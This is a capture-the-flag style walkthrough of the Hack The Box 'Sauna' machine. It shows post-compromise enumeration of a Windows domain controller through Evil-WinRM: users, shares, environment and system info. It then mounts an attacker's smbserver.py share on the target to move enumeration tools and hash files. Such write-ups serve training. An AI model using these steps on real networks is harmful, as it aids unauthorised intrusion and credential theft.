# Enumerating target with FSmith PS shell

First I checked the users directories. Its interesting to see that HSmith doesn't have a user directory, suggesting perhaps we weren't mean to get into his account, and its a rabbit hole.

```shell
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/25/2020   1:05 PM                Administrator
d-----        1/23/2020   9:52 AM                FSmith
d-r---        1/22/2020   9:32 PM                Public
d-----        1/24/2020   4:05 PM                svc_loanmgr
```
## Checking for PS history file
I checked if fsmith has PS command history file.
```shell
*Evil-WinRM* PS C:\Users\FSmith\AppData\Roaming\Microsoft\Windows> dir -Force


    Directory: C:\Users\FSmith\AppData\Roaming\Microsoft\Windows


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:19 AM                CloudStore
d-----        9/15/2018  12:19 AM                Network Shortcuts 
d-----        9/15/2018  12:19 AM                Printer Shortcuts
d-r---        9/15/2018  12:19 AM                Recent
d-r---        9/15/2018  12:19 AM                SendTo
d-r---        9/15/2018  12:19 AM                Start Menu
d-----        9/15/2018  12:19 AM                Templates
```
There's no Powershell folder here, which would exist if PS history was stored. Checking out **C:\Users\svc_loanmgr**

```shell
*Evil-WinRM* PS C:\Users> Get-Acl C:\Users\svc_loanmgr | Select -Expand AccessToString
Attempted to perform an unauthorized operation.
At line:1 char:1
+ Get-Acl C:\Users\svc_loanmgr | Select -Expand AccessToString
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Acl], UnauthorizedAccessException
    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.GetAclCommand
```

We don't have rights to even view the permissions. Same for Administrator folder.

```shell
*Evil-WinRM* PS C:\Users> Get-Acl C:\Users\Administrator | Select -Expand AccessToString
Attempted to perform an unauthorized operation.
At line:1 char:1
+ Get-Acl C:\Users\Administrator | Select -Expand AccessToString
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Acl], UnauthorizedAccessException
    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.GetAclCommand
```

## systeminfo in PS
Running `systeminfo` is blocked for this user.
```shell
*Evil-WinRM* PS C:\Users> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
  At line:1 char:1
  ~~~~~~~~~~
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
    ~~~~~~~~~~
```
but we can run its PS equivalent
```shell
*Evil-WinRM* PS C:\Users> Get-ComputerInfo

WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : ServerStandard
WindowsInstallationType                                 : Server
WindowsInstallDateFromRegistry                          : 1/23/2020 5:32:10 AM
WindowsProductId                                        : 00429-00000-00001-AA815
WindowsProductName                                      : Windows Server 2019 Standard
WindowsRegisteredOrganization                           :
WindowsRegisteredOwner                                  : Windows User
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 1809
BiosCharacteristics                                     :
BiosBIOSVersion                                         :
BiosBuildNumber                                         :
BiosCaption                                             :
BiosCodeSet                                             :
BiosCurrentLanguage                                     :
BiosDescription                                         :
BiosEmbeddedControllerMajorVersion                      :
BiosEmbeddedControllerMinorVersion                      :
BiosFirmwareType                                        :
BiosIdentificationCode                                  :
BiosInstallableLanguages                                :
BiosInstallDate                                         :
BiosLanguageEdition                                     :
BiosListOfLanguages                                     :
BiosManufacturer                                        :
BiosName                                                :
BiosOtherTargetOS                                       :
BiosPrimaryBIOS                                         :
BiosReleaseDate                                         :
BiosSeralNumber                                         :
BiosSMBIOSBIOSVersion                                   :
BiosSMBIOSMajorVersion                                  :
BiosSMBIOSMinorVersion                                  :
BiosSMBIOSPresent                                       :
BiosSoftwareElementState                                :
BiosStatus                                              :
BiosSystemBiosMajorVersion                              :
BiosSystemBiosMinorVersion                              :
BiosTargetOperatingSystem                               :
BiosVersion                                             :
CsAdminPasswordStatus                                   :
CsAutomaticManagedPagefile                              :
CsAutomaticResetBootOption                              :
CsAutomaticResetCapability                              :
CsBootOptionOnLimit                                     :
CsBootOptionOnWatchDog                                  :
CsBootROMSupported                                      :
CsBootStatus                                            :
CsBootupState                                           :
CsCaption                                               :
CsChassisBootupState                                    :
CsChassisSKUNumber                                      :
CsCurrentTimeZone                                       :
CsDaylightInEffect                                      :
CsDescription                                           :
CsDNSHostName                                           :
CsDomain                                                :
CsDomainRole                                            :
CsEnableDaylightSavingsTime                             :
CsFrontPanelResetStatus                                 :
CsHypervisorPresent                                     :
CsInfraredSupported                                     :
CsInitialLoadInfo                                       :
CsInstallDate                                           :
CsKeyboardPasswordStatus                                :
CsLastLoadInfo                                          :
CsManufacturer                                          :
CsModel                                                 :
CsName                                                  :
CsNetworkAdapters                                       :
CsNetworkServerModeEnabled                              :
CsNumberOfLogicalProcessors                             :
CsNumberOfProcessors                                    :
CsProcessors                                            :
CsOEMStringArray                                        :
CsPartOfDomain                                          :
CsPauseAfterReset                                       :
CsPCSystemType                                          :
CsPCSystemTypeEx                                        :
CsPowerManagementCapabilities                           :
CsPowerManagementSupported                              :
CsPowerOnPasswordStatus                                 :
CsPowerState                                            :
CsPowerSupplyState                                      :
CsPrimaryOwnerContact                                   :
CsPrimaryOwnerName                                      :
CsResetCapability                                       :
CsResetCount                                            :
CsResetLimit                                            :
CsRoles                                                 :
CsStatus                                                :
CsSupportContactDescription                             :
CsSystemFamily                                          :
CsSystemSKUNumber                                       :
CsSystemType                                            :
CsThermalState                                          :
CsTotalPhysicalMemory                                   :
CsPhyicallyInstalledMemory                              :
CsUserName                                              :
CsWakeUpType                                            :
CsWorkgroup                                             :
OsName                                                  :
OsType                                                  :
OsOperatingSystemSKU                                    :
OsVersion                                               :
OsCSDVersion                                            :
OsBuildNumber                                           :
OsHotFixes                                              :
OsBootDevice                                            :
OsSystemDevice                                          :
OsSystemDirectory                                       :
OsSystemDrive                                           :
OsWindowsDirectory                                      :
OsCountryCode                                           :
OsCurrentTimeZone                                       :
OsLocaleID                                              :
OsLocale                                                :
OsLocalDateTime                                         :
OsLastBootUpTime                                        :
OsUptime                                                :
OsBuildType                                             :
OsCodeSet                                               :
OsDataExecutionPreventionAvailable                      :
OsDataExecutionPrevention32BitApplications              :
OsDataExecutionPreventionDrivers                        :
OsDataExecutionPreventionSupportPolicy                  :
OsDebug                                                 :
OsDistributed                                           :
OsEncryptionLevel                                       :
OsForegroundApplicationBoost                            :
OsTotalVisibleMemorySize                                :
OsFreePhysicalMemory                                    :
OsTotalVirtualMemorySize                                :
OsFreeVirtualMemory                                     :
OsInUseVirtualMemory                                    :
OsTotalSwapSpaceSize                                    :
OsSizeStoredInPagingFiles                               :
OsFreeSpaceInPagingFiles                                :
OsPagingFiles                                           :
OsHardwareAbstractionLayer                              :
OsInstallDate                                           :
OsManufacturer                                          :
OsMaxNumberOfProcesses                                  :
OsMaxProcessMemorySize                                  :
OsMuiLanguages                                          :
OsNumberOfLicensedUsers                                 :
OsNumberOfProcesses                                     :
OsNumberOfUsers                                         :
OsOrganization                                          :
OsArchitecture                                          :
OsLanguage                                              :
OsProductSuites                                         :
OsOtherTypeDescription                                  :
OsPAEEnabled                                            :
OsPortableOperatingSystem                               :
OsPrimary                                               :
OsProductType                                           :
OsRegisteredUser                                        :
OsSerialNumber                                          :
OsServicePackMajorVersion                               :
OsServicePackMinorVersion                               :
OsStatus                                                :
OsSuites                                                :
OsServerLevel                                           : FullServer
KeyboardLayout                                          :
TimeZone                                                : (UTC-08:00) Pacific Time (US & Canada)
LogonServer                                             :
PowerPlatformRole                                       : Desktop
HyperVisorPresent                                       :
HyperVRequirementDataExecutionPreventionAvailable       :
HyperVRequirementSecondLevelAddressTranslation          :
HyperVRequirementVirtualizationFirmwareEnabled          :
HyperVRequirementVMMonitorModeExtensions                :
DeviceGuardSmartStatus                                  : Off
DeviceGuardRequiredSecurityProperties                   :
DeviceGuardAvailableSecurityProperties                  :
DeviceGuardSecurityServicesConfigured                   :
DeviceGuardSecurityServicesRunning                      :
DeviceGuardCodeIntegrityPolicyEnforcementStatus         :
DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus :
```
which tells us surprisingly little. Let's check the environment variables, which can tell us if we're on x64 or x86 Windows though its likely x64.
```shell
*Evil-WinRM* PS C:\Users> ls env:

Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\FSmith\AppData\Roaming
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   SAUNA
ComSpec                        C:\Windows\system32\cmd.exe
DriverData                     C:\Windows\System32\Drivers\DriverData
LOCALAPPDATA                   C:\Users\FSmith\AppData\Local
NUMBER_OF_PROCESSORS           2
OS                             Windows_NT
Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\FSmith\AppData\Local\Microsoft\WindowsApps
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL                23
PROCESSOR_REVISION             3100
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PSModulePath                   C:\Users\FSmith\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC                         C:\Users\Public
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\FSmith\AppData\Local\Temp
TMP                            C:\Users\FSmith\AppData\Local\Temp
USERDNSDOMAIN                  EGOTISTICAL-BANK.LOCAL
USERDOMAIN                     EGOTISTICALBANK
USERNAME                       FSmith
USERPROFILE                    C:\Users\FSmith
windir                         C:\Windows
```
## Listing AD users
We can list all domain users with
```shell
*Evil-WinRM* PS C:\Users\FSmith\AppData\Local\Temp> Get-LocalUser | Select *


AccountExpires         :
Description            : Built-in account for administering the computer/domain
Enabled                : True
FullName               :
PasswordChangeableDate : 1/25/2020 9:14:15 AM
PasswordExpires        :
UserMayChangePassword  : True
PasswordRequired       : True
PasswordLastSet        : 1/24/2020 9:14:15 AM
LastLogon              : 6/29/2020 2:41:39 PM
Name                   : Administrator
SID                    : S-1-5-21-2966785786-3096785034-1186376766-500
PrincipalSource        : ActiveDirectory
ObjectClass            : User

AccountExpires         :
Description            : Built-in account for guest access to the computer/domain
Enabled                : False
FullName               :
PasswordChangeableDate :
PasswordExpires        :
UserMayChangePassword  : True
PasswordRequired       : False
PasswordLastSet        :
LastLogon              :
Name                   : Guest
SID                    : S-1-5-21-2966785786-3096785034-1186376766-501
PrincipalSource        : ActiveDirectory
ObjectClass            : User

AccountExpires         :
Description            : Key Distribution Center Service Account
Enabled                : False
FullName               :
PasswordChangeableDate : 1/23/2020 9:45:30 PM
PasswordExpires        : 3/4/2020 9:45:30 PM
UserMayChangePassword  : True
PasswordRequired       : True
PasswordLastSet        : 1/22/2020 9:45:30 PM
LastLogon              :
Name                   : krbtgt
SID                    : S-1-5-21-2966785786-3096785034-1186376766-502
PrincipalSource        : ActiveDirectory
ObjectClass            : User

AccountExpires         :
Description            :
Enabled                : True
FullName               : Hugo Smith
PasswordChangeableDate : 1/23/2020 9:54:34 PM
PasswordExpires        : 3/4/2020 9:54:34 PM
UserMayChangePassword  : True
PasswordRequired       : True
PasswordLastSet        : 1/22/2020 9:54:34 PM
LastLogon              :
Name                   : HSmith
SID                    : S-1-5-21-2966785786-3096785034-1186376766-1103
PrincipalSource        : ActiveDirectory
ObjectClass            : User

AccountExpires         :
Description            :
Enabled                : True
FullName               : Fergus Smith
PasswordChangeableDate : 1/24/2020 8:45:19 AM
PasswordExpires        :
UserMayChangePassword  : True
PasswordRequired       : True
PasswordLastSet        : 1/23/2020 8:45:19 AM
LastLogon              : 10/17/2020 1:39:36 PM
Name                   : FSmith
SID                    : S-1-5-21-2966785786-3096785034-1186376766-1105
PrincipalSource        : ActiveDirectory
ObjectClass            : User

AccountExpires         :
Description            :
Enabled                : True
FullName               : L Manager
PasswordChangeableDate : 1/25/2020 3:48:31 PM
PasswordExpires        :
UserMayChangePassword  : True
PasswordRequired       : True
PasswordLastSet        : 1/24/2020 3:48:31 PM
LastLogon              :
Name                   : svc_loanmgr
SID                    : S-1-5-21-2966785786-3096785034-1186376766-1108
PrincipalSource        : ActiveDirectory
ObjectClass            : User
```
## Enumerating shares from the inside
From the inside we can see all the shares, though we don't have new access, even the sharepath is hidden.

```shell
*Evil-WinRM* PS C:\Users\FSmith\Documents> Get-SmbShare

Name                         ScopeName Path Description
----                         --------- ---- -----------
ADMIN$                       *              Remote Admin
C$                           *              Default share
IPC$                         *              Remote IPC
NETLOGON                     *              Logon server share
print$                       *              Printer Drivers
RICOH Aficio SP 8300DN PCL 6 *              We cant print money
SYSVOL                       *              Logon server share
```
To view the properties of a share, such as **print$** we can do
```shell
*Evil-WinRM* PS C:\Users\FSmith\Documents> Get-SmbShare -Name "print$" | Format-List -Property *


PresetPathAcl         :
ShareState            : Pending
AvailabilityType      : NonClustered
ShareType             : FileSystemDirectory
FolderEnumerationMode : Unrestricted
CachingMode           : Manual
LeasingMode           : Full
SmbInstance           : Default
CATimeout             : 0
ConcurrentUserLimit   : 0
ContinuouslyAvailable : False
CurrentUsers          : 0
Description           : Printer Drivers
EncryptData           : False
IdentityRemoting      : False
Infrastructure        : False
Name                  : print$
Path                  :
Scoped                : False
ScopeName             : *
SecurityDescriptor    :
ShadowCopy            : False
Special               : False
Temporary             : False
Volume                :
PSComputerName        :
CimClass              : ROOT/Microsoft/Windows/SMB:MSFT_SmbShare
CimInstanceProperties : {AvailabilityType, CachingMode, CATimeout, ConcurrentUserLimit...}
CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties
```
The path is still hidden form us. So this doesn't tell us much.
## List services
I tried to enumerate the running services but couldn't open the Service Control Manager
```shell
*Evil-WinRM* PS C:\Users\FSmith\AppData\Local\Temp> Get-Service
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
At line:1 char:1
+ Get-Service
+ ~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand
```
## Mount smbserver.py Kali share
Here's how to mount it as a drive for read/write access
On Kali we do
```shell
root@Kali:~/HTB/Sauna# smbserver.py -smb2support -username kali -password password sauna .
```
Then on target:
```shell
*Evil-WinRM* PS C:\Users\FSmith\Documents> net use Z: \\10.10.14.78\sauna /user:kali password
The command completed successfully.

*Evil-WinRM* PS C:\Users\FSmith\Documents> Z:
*Evil-WinRM* PS Z:\> dir


    Directory: Z:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/17/2020   1:40 PM           2113 hsmith.hash
-a----       10/17/2020   2:19 PM         229376 winPEASx64.exe
-a----       10/17/2020   5:16 AM             72 usernames
-a----       10/18/2020   4:08 AM         280604 PrivescCheck.ps1
-a----       10/17/2020   3:41 AM            815 nmap.ports
-a----       10/17/2020   6:05 AM            591 fsmith.hash
-a----       10/17/2020   7:53 AM        1855488 Sauna.jex
```
Now we can read/write to Kali. I recommend creating a new directory for this. There's a chance that Win Defender would detect the enumeration programs and scripts and malicious and then delete them off Kali.

Once mounted we can list all the drives to see it as well as check other drives exist.
```shell
*Evil-WinRM* PS C:\Users\FSmith\AppData\Local\Temp> Get-PsDrive -PsProvider FileSystem

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
C                                      FileSystem    C:\                                                                                                                                                                  Users\FSmith\AppData\Local\Temp
Z                                      FileSystem    \\10.10.14.78\sauna
```